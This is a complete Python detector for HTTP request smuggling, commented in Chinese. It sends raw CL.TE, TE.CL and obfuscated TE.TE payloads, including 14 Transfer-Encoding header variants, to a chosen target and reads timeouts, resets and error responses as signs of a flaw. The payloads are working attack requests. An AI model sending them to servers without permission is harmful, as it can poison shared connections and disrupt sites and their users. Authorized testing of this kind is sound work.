#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP 请求走私漏洞检测工具 v1.2
================================
检测三种核心场景：
    1. CL.TE  —— 前端按 Content-Length 解析，后端按 Transfer-Encoding 解析
    2. TE.CL  —— 前端按 Transfer-Encoding 解析，后端按 Content-Length 解析
    3. TE.TE  —— 两端都声称支持 TE，通过对 TE 头部做混淆变形使其中一端退化为 CL

检测原理：
    利用时间差 + 响应差异。走私的残留字节会污染后续复用连接上的请求，
    导致探测请求超时、连接被重置、返回 400/405，或响应中出现被注入的前缀。

v1.2 修复清单（相对 v1.1）：
    [F1] 连接资源泄漏：所有检测方法改用 try/finally 确保 socket 关闭
    [F2] socket 超时残留：_probe 发送前显式重置超时为 self.timeout
    [F3] 无 User-Agent：所有请求补 UA 头，避免严格服务器返回 400 导致误报；
         基线阶段记录响应状态码，若基线也为 400/405 则不将 error_hit 作为阳性信号
    [F4] reset_hit 误判：drain 返回连接是否已关闭，若已关闭则跳过本轮探测
    [F5] chunked 解析：用逐块解析取代子串匹配，正确处理 trailer 和 chunk 数据中的误匹配
    [F6] TE.TE 性能：内层循环命中达阈值即提前退出

⚠️  仅用于授权渗透测试与安全研究。未经授权对他人系统使用属违法行为。

依赖：Python 3.8+，仅使用标准库。
"""

import argparse
import socket
import ssl
import sys
import time
from urllib.parse import urlparse


# ---------------------------------------------------------------------------
# 颜色输出（Windows 终端兼容）
# ---------------------------------------------------------------------------
class C:
    R = "\033[31m"   # 红 —— 漏洞/危险
    G = "\033[32m"   # 绿 —— 正常/安全
    Y = "\033[33m"   # 黄 —— 警告/疑似
    B = "\033[36m"   # 青 —— 信息
    D = "\033[90m"   # 灰 —— 调试
    N = "\033[0m"


def _enable_ansi():
    """在 Windows 10+ 终端启用 ANSI 颜色转义。"""
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_ansi()


def info(msg):    print(f"{C.B}[*]{C.N} {msg}")
def ok(msg):      print(f"{C.G}[+]{C.N} {msg}")
def warn(msg):    print(f"{C.Y}[!]{C.N} {msg}")
def vuln(msg):    print(f"{C.R}[VULN]{C.N} {msg}")
def err(msg):     print(f"{C.R}[ERR]{C.N} {msg}")
def debug(msg):   print(f"{C.D}[D]{C.N} {msg}")


MAX_RESP = 1 << 20          # 单响应读取上限 1MB
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SmugglingDetector/1.2"


# ---------------------------------------------------------------------------
# 底层连接：发送原始字节，精确控制 \r\n，禁止任何规范化
# ---------------------------------------------------------------------------
class RawHTTPClient:
    """原始 HTTP/1.1 客户端，可发送畸形/双头部请求。"""

    def __init__(self, host, port, use_tls, timeout, sni=None):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.sni = sni or host
        self.sock = None

    def connect(self):
        raw = socket.create_connection((self.host, self.port), timeout=self.timeout)
        raw.settimeout(self.timeout)
        if self.use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = ctx.wrap_socket(raw, server_hostname=self.sni)
        self.sock = raw
        return self

    def send(self, data: bytes):
        self.sock.sendall(data)

    def reset_timeout(self):
        """[F2] 将 socket 超时重置为连接初始值，消除 drain 残留的短超时。"""
        self.sock.settimeout(self.timeout)

    @staticmethod
    def _chunked_complete(data, start):
        """
        [F5] 逐块解析 chunked body，判断是否已收齐终止块。
        正确处理：
          - 多分块响应
          - chunk 扩展（分号后的部分，如 5;ext=val）
          - trailer 头部（终止块后的可选头，以空行结束）
          - chunk 数据中恰好包含 \\r\\n0\\r\\n\\r\\n 字节序列（不会误匹配）
        """
        pos = start
        while pos < len(data):
            line_end = data.find(b"\r\n", pos)
            if line_end == -1:
                return False
            size_field = data[pos:line_end].split(b";")[0].strip()
            try:
                chunk_size = int(size_field, 16)
            except ValueError:
                return False
            pos = line_end + 2
            if chunk_size == 0:
                while True:
                    trailer_end = data.find(b"\r\n", pos)
                    if trailer_end == -1:
                        return False
                    if trailer_end == pos:
                        return True
                    pos = trailer_end + 2
            else:
                data_end = pos + chunk_size + 2
                if data_end > len(data):
                    return False
                pos = data_end
        return False

    def recv_response(self, max_wait, tail_wait=0.3):
        """
        读取一个完整 HTTP 响应，正常响应收齐即返回（快），
        只有响应被挂起才会耗尽 max_wait —— 并抛出 socket.timeout。

        收尾策略：
            - 头部在 max_wait 内收不齐       -> raise socket.timeout
            - 有 Content-Length             -> 精确补齐（补不齐且未断连 -> raise）
            - Transfer-Encoding: chunked    -> 逐块解析到终止块 [F5]
            - 都无法判断（如无 CL 的 400）  -> tail_wait 静默/断连收尾
        """
        deadline = time.time() + max_wait
        data = b""

        # 阶段 1：收响应头。此阶段超时 = 后端挂起，必须向上抛，不能吞。
        while b"\r\n\r\n" not in data:
            remain = deadline - time.time()
            if remain <= 0:
                raise socket.timeout("response headers not received in time")
            self.sock.settimeout(remain)
            buf = self.sock.recv(4096)
            if not buf:
                return data
            data += buf
            if len(data) > MAX_RESP:
                return data

        hend = data.index(b"\r\n\r\n") + 4
        head = data[:hend].lower()

        cl = None
        te_chunked = False
        for line in head.split(b"\r\n"):
            if line.startswith(b"content-length:"):
                try:
                    cl = int(line.split(b":", 1)[1].strip())
                except ValueError:
                    cl = None
            elif line.startswith(b"transfer-encoding:") and b"chunked" in line:
                te_chunked = True

        # 阶段 2a：Content-Length 精确收尾
        if cl is not None:
            target = hend + cl
            while len(data) < target:
                remain = deadline - time.time()
                if remain <= 0:
                    raise socket.timeout("response body incomplete")
                self.sock.settimeout(remain)
                buf = self.sock.recv(4096)
                if not buf:
                    break
                data += buf
                if len(data) > MAX_RESP:
                    break
            return data

        # 阶段 2b：chunked 逐块解析收尾 [F5]
        if te_chunked:
            while not self._chunked_complete(data, hend):
                remain = deadline - time.time()
                if remain <= 0:
                    raise socket.timeout("chunked body not terminated")
                self.sock.settimeout(remain)
                buf = self.sock.recv(4096)
                if not buf:
                    return data
                data += buf
                if len(data) > MAX_RESP:
                    return data
            return data

        # 阶段 2c：长度未知，静默/断连收尾（此时短超时不向上抛，属正常结束）
        self.sock.settimeout(tail_wait)
        try:
            while True:
                buf = self.sock.recv(4096)
                if not buf:
                    break
                data += buf
                if len(data) > MAX_RESP:
                    break
        except socket.timeout:
            pass
        return data

    def drain(self, wait=0.4):
        """
        吞掉攻击请求自身的响应（其内容不重要），静默 wait 或断连即返回。
        [F4] 返回 True 表示对端已关闭连接，调用方应跳过后续探测。
        """
        self.sock.settimeout(wait)
        try:
            while True:
                buf = self.sock.recv(4096)
                if not buf:
                    return True
        except (socket.timeout, ConnectionResetError, ConnectionAbortedError, OSError):
            return False

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass
        self.sock = None


# ---------------------------------------------------------------------------
# 检测器主体
# ---------------------------------------------------------------------------
class SmugglerDetector:

    # TE 头部混淆变形清单（用于 TE.TE 场景）
    TE_OBFUSCATIONS = [
        ("Transfer-Encoding: chunked",                            "标准 baseline"),
        ("Transfer-Encoding: chunked\r\nTransfer-Encoding: cow",  "重复 TE，第二值非法"),
        ("Transfer-Encoding: chunked, cow",                       "逗号分隔多值，尾值非法"),
        ("Transfer-Encoding: chunked\r\nTransfer-encoding: identity", "大小写差异重复"),
        ("Transfer-Encoding:\tchunked",                           "冒号后制表符"),
        ("Transfer-Encoding : chunked",                           "冒号前空格"),
        ("Transfer-Encoding: chunked ",                           "尾部空格"),
        ("Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked", "两次合法 chunked"),
        ("Transfer-Encoding: xchunked",                           "非法值 xchunked"),
        ("Transfer-Encoding: chunked\r\nX: x\r\nTransfer-Encoding: cow", "中间插入其它头"),
        ("transfer-encoding: chunked",                            "全小写"),
        ("TRANSFER-ENCODING: chunked",                            "全大写"),
        (" Transfer-Encoding: chunked",                           "行首空格（折叠续行）"),
        ("Transfer-Encoding: chunked\r\n\tTransfer-Encoding: cow", "缩进续行混淆"),
    ]

    def __init__(self, target, timeout=5.0, probe_timeout=8.0, trials=3):
        p = urlparse(target if "://" in target else "http://" + target)
        self.scheme = p.scheme or "http"
        self.use_tls = self.scheme == "https"
        self.host = p.hostname
        if not self.host:
            raise ValueError(f"无法解析目标地址: {target!r}")
        self.port = p.port or (443 if self.use_tls else 80)
        default_port = 443 if self.use_tls else 80
        self.host_header = (self.host if self.port == default_port
                            else f"{self.host}:{self.port}")
        self.path = (p.path or "/") + (f"?{p.query}" if p.query else "")
        self.timeout = timeout
        self.probe_timeout = probe_timeout
        self.trials = max(1, trials)
        self.baseline_error = False    # [F3] 基线响应是否为 400/405
        self.baseline = self._measure_baseline()
        info(f"目标: {self.scheme}://{self.host}:{self.port}{self.path}")
        info(f"基线响应时间: {self.baseline:.3f}s（正常请求均值，与探测同口径）")
        if self.baseline_error:
            warn("基线探测返回 400/405，error_hit 信号将被禁用以防误报")

    # ---------- 基础工具 ----------
    def _new_conn(self):
        return RawHTTPClient(self.host, self.port, self.use_tls, self.timeout).connect()

    def _threshold(self):
        """过半命中阈值，三个场景统一使用。"""
        return max(1, self.trials // 2 + 1)

    def _measure_baseline(self):
        """发送若干正常 GET，取平均响应时间作为基线。全部失败则视为目标不可达。"""
        times = []
        for _ in range(3):
            try:
                c = self._new_conn()
                req = (
                    f"GET {self.path} HTTP/1.1\r\n"
                    f"Host: {self.host_header}\r\n"
                    f"User-Agent: {UA}\r\n"            # [F3]
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
                t0 = time.time()
                c.send(req)
                resp = c.recv_response(max_wait=self.timeout)
                times.append(time.time() - t0)
                # [F3] 记录基线响应是否为 400/405
                resp_text = resp.decode("latin-1", errors="ignore")[:32]
                if "400 Bad" in resp_text or "405 Method" in resp_text:
                    self.baseline_error = True
                c.close()
            except Exception as e:
                debug(f"基线测量失败: {e}")
        if not times:
            raise RuntimeError("基线测量全部失败：目标不可达或 TLS 握手异常，请检查后重试")
        return sum(times) / len(times)

    def _probe(self, connection=None, label="probe"):
        """
        发送一个正常 GET 探测请求。
        返回 (耗时, 是否真实超时, 是否连接重置, 响应字节)。
        走私成立时残留字节会拼到本探测请求前，导致后端挂起（超时）、
        重置连接，或返回 400/405。
        """
        own = connection is None
        if own:
            connection = self._new_conn()
        req = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"User-Agent: {UA}\r\n"            # [F3]
            f"Connection: keep-alive\r\n\r\n"
        ).encode()
        t0 = time.time()
        timed_out = False
        reset = False
        body = b""
        try:
            connection.reset_timeout()          # [F2] 消除 drain 残留的短超时
            connection.send(req)
            body = connection.recv_response(max_wait=self.probe_timeout)
        except (socket.timeout, TimeoutError):
            timed_out = True
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
            reset = True
            debug(f"{label}: 连接被重置/中断（{e}）")
        elapsed = time.time() - t0
        if own:
            connection.close()
        return elapsed, timed_out, reset, body

    # -----------------------------------------------------------------
    # 1) CL.TE 检测：前端按 CL=6，后端按 TE 在 "0\r\n\r\n" 结束，残留 "G"
    #    污染下一请求 -> "GGET ..." -> 后端挂起 / 重置 / 400
    # -----------------------------------------------------------------
    def detect_cl_te(self):
        info("========== [1/3] 检测 CL.TE ==========")
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"User-Agent: {UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"0\r\n\r\n"
            f"G"
        ).encode()

        confirmed = 0
        for i in range(self.trials):
            debug(f"CL.TE 第 {i+1}/{self.trials} 次尝试...")
            conn = None
            try:
                conn = self._new_conn()
                conn.send(payload)
                closed = conn.drain(0.4)            # [F4]
                if closed:
                    debug("CL.TE: 攻击响应后连接被关闭，跳过本轮探测")
                    continue
                elapsed, timed_out, reset, body = self._probe(connection=conn, label="CL.TE")
                if self._judge("CL.TE", elapsed, timed_out, reset, body):
                    confirmed += 1
            except Exception as e:
                debug(f"CL.TE 异常: {e}")
            finally:                                 # [F1]
                if conn:
                    conn.close()
            time.sleep(0.4)

        self._report("CL.TE", confirmed)

    # -----------------------------------------------------------------
    # 2) TE.CL 检测：前端按 TE 整体转发；后端按 CL 只读 chunk-size 行，
    #    残留完整 "GPOST ..." 成为下一请求 -> 后端挂起 / 重置 / 400
    # -----------------------------------------------------------------
    def detect_te_cl(self):
        info("========== [2/3] 检测 TE.CL ==========")
        smuggled = (
            f"GPOST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Length: 100\r\n"
            f"\r\n"
            f"x=1\r\n"
        )
        smug_bytes = smuggled.encode()
        chunk_size = format(len(smug_bytes), "x")
        cl_len = len(chunk_size) + 2
        debug(f"TE.CL 走私载荷 {len(smug_bytes)}B，chunk-size={chunk_size}，CL={cl_len}")
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"User-Agent: {UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {cl_len}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"{chunk_size}\r\n"
            f"{smuggled}"
            f"0\r\n\r\n"
        ).encode()

        confirmed = 0
        for i in range(self.trials):
            debug(f"TE.CL 第 {i+1}/{self.trials} 次尝试...")
            conn = None
            try:
                conn = self._new_conn()
                conn.send(payload)
                closed = conn.drain(0.4)            # [F4]
                if closed:
                    debug("TE.CL: 攻击响应后连接被关闭，跳过本轮探测")
                    continue
                elapsed, timed_out, reset, body = self._probe(connection=conn, label="TE.CL")
                if self._judge("TE.CL", elapsed, timed_out, reset, body):
                    confirmed += 1
            except Exception as e:
                debug(f"TE.CL 异常: {e}")
            finally:                                 # [F1]
                if conn:
                    conn.close()
            time.sleep(0.4)

        self._report("TE.CL", confirmed)

    # -----------------------------------------------------------------
    # 3) TE.TE 检测（混淆枚举）
    #    遍历 TE 头部变形，每种变形套用 CL.TE 与 TE.CL 两套载荷；
    #    与其它场景统一标准：满 trials 次、过半命中才确认该变形。
    # -----------------------------------------------------------------
    def detect_te_te(self):
        info("========== [3/3] 检测 TE.TE（混淆枚举） ==========")
        confirmed_variants = []
        threshold = self._threshold()

        for te_line, desc in self.TE_OBFUSCATIONS:
            info(f"  测试变形: {desc}")
            cl_te_payload = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host_header}\r\n"
                f"User-Agent: {UA}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"{te_line}\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"0\r\n\r\n"
                f"G"
            ).encode()

            smuggled = (
                f"GPOST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host_header}\r\n"
                f"Content-Length: 100\r\n"
                f"\r\n"
                f"x=1\r\n"
            )
            smug_bytes = smuggled.encode()
            chunk_size = format(len(smug_bytes), "x")
            cl_len = len(chunk_size) + 2
            te_cl_payload = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host_header}\r\n"
                f"User-Agent: {UA}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {cl_len}\r\n"
                f"{te_line}\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"{chunk_size}\r\n"
                f"{smuggled}"
                f"0\r\n\r\n"
            ).encode()

            hit = False
            for payload, tag in ((cl_te_payload, "CL.TE风格"), (te_cl_payload, "TE.CL风格")):
                if hit:
                    break
                hits = 0
                for _ in range(self.trials):
                    if hits >= threshold:            # [F6] 已达阈值，提前退出
                        break
                    conn = None
                    try:
                        conn = self._new_conn()
                        conn.send(payload)
                        closed = conn.drain(0.3)    # [F4]
                        if closed:
                            debug(f"TE.TE/{tag}: 攻击响应后连接被关闭，跳过")
                            continue
                        elapsed, timed_out, reset, body = self._probe(
                            connection=conn, label=f"TE.TE/{tag}")
                        if self._judge(f"TE.TE({desc}/{tag})", elapsed,
                                       timed_out, reset, body, verbose=False):
                            hits += 1
                    except Exception as e:
                        debug(f"TE.TE 异常: {e}")
                    finally:                         # [F1]
                        if conn:
                            conn.close()
                    time.sleep(0.3)
                if hits >= threshold:
                    confirmed_variants.append((desc, tag, hits))
                    hit = True
                    break

        if confirmed_variants:
            vuln("TE.TE 漏洞确认！以下变形触发走私：")
            for desc, tag, hits in confirmed_variants:
                print(f"      {C.R}- {desc}（{tag}，命中 {hits}/{self.trials} 次）{C.N}")
        else:
            ok("TE.TE：未发现可触发走私的 TE 头部变形。")

    # -----------------------------------------------------------------
    # 判定逻辑：全部基于真实信号
    # -----------------------------------------------------------------
    def _judge(self, tag, elapsed, timed_out, reset, body, verbose=True):
        body_text = body.decode("latin-1", errors="ignore")
        # 特征1：探测请求真实超时（后端被残留请求挂起，收不齐响应）
        timeout_hit = timed_out
        # 特征2：响应中出现被注入的前缀（GPOST / GGET）
        prefix_hit = "GPOST" in body_text or "GGET" in body_text
        # 特征3：400/405 错误（后端把 "GGET"/"GPOST" 当非法请求拒绝）
        # [F3] 若基线探测本身就返回 400/405，则不将此作为阳性信号
        error_hit = (not self.baseline_error and
                     any(code in body_text[:32] for code in ("400 Bad", "405 Method")))
        # 特征4：连接被重置/中断（后端拒绝毒化请求后关连接）
        reset_hit = reset

        suspicious = timeout_hit or prefix_hit or error_hit or reset_hit

        if verbose:
            if timeout_hit:
                debug(f"{tag}: 探测真实超时（{elapsed:.2f}s 内未收齐响应）")
            if reset_hit:
                debug(f"{tag}: 探测连接被重置")
            if error_hit:
                debug(f"{tag}: 探测响应为 400/405 -> {body_text[:60]!r}")
            if prefix_hit:
                debug(f"{tag}: 响应出现注入前缀 -> {body_text[:80]!r}")

        return suspicious

    def _report(self, tag, confirmed):
        threshold = self._threshold()
        if confirmed >= threshold:
            vuln(f"{tag} 漏洞确认！命中 {confirmed}/{self.trials} 次。")
        elif confirmed > 0:
            warn(f"{tag} 疑似走私（命中 {confirmed}/{self.trials} 次），建议人工复核。")
        else:
            ok(f"{tag}：未检测到走私迹象。")

    # -----------------------------------------------------------------
    # 入口
    # -----------------------------------------------------------------
    def run(self):
        info("开始 HTTP 请求走私检测（仅供授权测试）")
        self.detect_cl_te()
        print()
        self.detect_te_cl()
        print()
        self.detect_te_te()
        print()
        info("检测完成。")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def banner():
    print(f"""{C.Y}
╔══════════════════════════════════════════════════════════════╗
║          HTTP Request Smuggling Detector  v1.2              ║
║          CL.TE  /  TE.CL  /  TE.TE  三场景检测               ║
║          ⚠ 仅用于授权渗透测试与安全研究                       ║
╚══════════════════════════════════════════════════════════════╝{C.N}
""")


def main():
    banner()
    ap = argparse.ArgumentParser(
        description="HTTP 请求走私漏洞检测工具 v1.2（CL.TE / TE.CL / TE.TE）",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    ap.add_argument("target", help="目标 URL，如 https://example.com 或 http://10.0.0.1:8080/")
    ap.add_argument("-t", "--timeout", type=float, default=5.0, help="单连接超时秒数（默认 5）")
    ap.add_argument("-p", "--probe-timeout", type=float, default=8.0,
                    help="探测请求等待完整响应的截止秒数（默认 8，越大越灵敏越慢）")
    ap.add_argument("-n", "--trials", type=int, default=3, help="每场景重复尝试次数（默认 3）")
    args = ap.parse_args()

    if not args.target:
        ap.error("请提供目标 URL")

    try:
        det = SmugglerDetector(
            target=args.target,
            timeout=args.timeout,
            probe_timeout=args.probe_timeout,
            trials=args.trials,
        )
    except Exception as e:
        err(f"初始化失败: {e}")
        sys.exit(2)

    try:
        det.run()
    except KeyboardInterrupt:
        warn("用户中断。")
        sys.exit(130)
    except Exception as e:
        err(f"检测过程异常: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
